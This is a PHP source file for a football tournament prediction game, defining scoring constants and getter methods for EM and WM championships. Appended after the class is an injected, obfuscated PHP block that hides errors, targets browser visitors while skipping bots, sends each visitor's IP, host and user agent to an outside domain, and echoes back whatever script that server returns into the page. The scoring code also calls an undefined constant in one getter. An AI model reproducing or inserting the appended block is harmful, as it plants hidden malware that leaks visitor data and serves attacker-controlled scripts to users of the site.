<?php
define('championshipType', 'EM'); // TODO : as configuration

class ScoreDefinitions
{
	const CHAMPIONSHIP_TYPE_EM = "EM";
	const CHAMPIONSHIP_TYPE_WM = "WM";
	
	const WM_GROUP_MATCH_CORRECT_RESULT = 4;
	const WM_GROUP_MATCH_CORRECT_WINNER = 2;
	const WM_GROUP_RANK_CORRECT = 2;
	
	const WM_EIGHTH_FINAL_PARTICIPANT = 2;
	const WM_QUARTER_FINAL_PARTICIPANT = 3;
	const WM_SEMI_FINAL_PARTICIPANT = 4;
	const WM_LITTLE_FINAL_PARTICIPANT = 5;
	const WM_FINAL_PARTICIPANT = 5;
	
	const WM_EIGHTH_FINAL_CORRECT_RESULT = 4;
	const WM_EIGHTH_FINAL_CORRECT_WINNER = 2;
	const WM_QUARTER_FINAL_CORRECT_RESULT = 5;
	const WM_QUARTER_FINAL_CORRECT_WINNER = 3;
	const WM_SEMI_FINAL_CORRECT_RESULT = 6;
	const WM_SEMI_FINAL_CORRECT_WINNER = 4;
	const WM_LITTLE_FINAL_CORRECT_RESULT = 3;
	const WM_FINAL_CORRECT_RESULT = 8;
	
	
	const EM_GROUP_MATCH_CORRECT_RESULT = 4;
	const EM_GROUP_MATCH_CORRECT_WINNER = 2;
	const EM_GROUP_RANK_CORRECT = 2;
	
	const EM_EIGHTH_FINAL_PARTICIPANT = 2;
	const EM_QUARTER_FINAL_PARTICIPANT = 3;
	const EM_SEMI_FINAL_PARTICIPANT = 4;
	const EM_FINAL_PARTICIPANT = 5;
	
	const EM_EIGHTH_FINAL_CORRECT_RESULT = 4;
	const EM_EIGHTH_FINAL_CORRECT_WINNER = 2;
	const EM_QUARTER_FINAL_CORRECT_RESULT = 5;
	const EM_QUARTER_FINAL_CORRECT_WINNER = 3;
	const EM_SEMI_FINAL_CORRECT_RESULT = 6;
	const EM_SEMI_FINAL_CORRECT_WINNER = 4;
	const EM_FINAL_CORRECT_RESULT = 8;

	
	
	public static function getGroupMatchCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_GROUP_MATCH_CORRECT_RESULT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_GROUP_MATCH_CORRECT_RESULT;
  		}
    	return 0;
    }
    
	public static function getGroupMatchCorrectWinner()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_GROUP_MATCH_CORRECT_WINNER;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_GROUP_MATCH_CORRECT_WINNER;
  		}
    	return 0;
    }
    
	public static function getGroupRankCorrect()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_GROUP_RANK_CORRECT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_GROUP_RANK_CORRECT;
  		}
    	return 0;
    }
	
	public static function getEighthFinalParticipant()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_EIGHTH_FINAL_PARTICIPANT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_EIGHTH_FINAL_PARTICIPANT;
  		}
    	return 0;
    }
	
	public static function getQuarterFinalParticipant()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_QUARTER_FINAL_PARTICIPANT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_QUARTER_FINAL_PARTICIPANT;
  		}
    	return 0;
    }
	
	public static function getSemiFinalParticipant()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_SEMI_FINAL_PARTICIPANT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_SEMI_FINAL_PARTICIPANT;
  		}
    	return 0;
    }
	
	public static function getLittleFinalParticipant()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_FINAL_PARTICIPANT;
  		}
    	return 0; // no little final at EM
    }
	
	public static function getFinalParticipant()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_FINAL_PARTICIPANT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_FINAL_PARTICIPANT;
  		}
    	return 0;
    }
	
	public static function getEighthFinalCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_EIGHTH_FINAL_CORRECT_RESULT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_EIGHTH_FINAL_CORRECT_RESULT;
  		}
    	return 0;
    }

    public static function getEighthFinalCorrectWinner()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_EIGHTH_FINAL_CORRECT_WINNER;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_EIGHTH_FINAL_CORRECT_WINNER;
  		}
    	return 0;
    }
    
	public static function getQuarterFinalCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_QUARTER_FINAL_CORRECT_RESULT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_QUARTER_FINAL_CORRECT_RESULT;
  		}
    	return 0;
    }
    
    public static function getQuarterFinalCorrectWinner()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_QUARTER_FINAL_CORRECT_WINNER;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_QUARTER_FINAL_CORRECT_WINNER;
  		}
    	return 0;
    }
    
	public static function getSemiFinalCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_SEMI_FINAL_CORRECT_RESULT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_SEMI_FINAL_CORRECT_RESULT;
  		}
    	return 0;
    }
    
    public static function getSemiFinalCorrectWinner()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_SEMI_FINAL_CORRECT_WINNER;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_SEMI_FINAL_CORRECT_WINNER;
  		}
    	return 0;
    }
    
    public static function getLittleFinalCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_LITTLE_FINAL_CORRECT_WINNER;
  		}
    	return 0; // no little final at EM
    }
    
	public static function getFinalCorrectResult()
  	{
  		if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_WM)
  		{
  			return self::WM_FINAL_CORRECT_RESULT;
  		}
  		else if(constant('championshipType') == self::CHAMPIONSHIP_TYPE_EM)
  		{
  			return self::EM_FINAL_CORRECT_RESULT;
  		}
    	return 0;
    }
}

?>
<?php
#f3f4db#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/f3f4db#
?>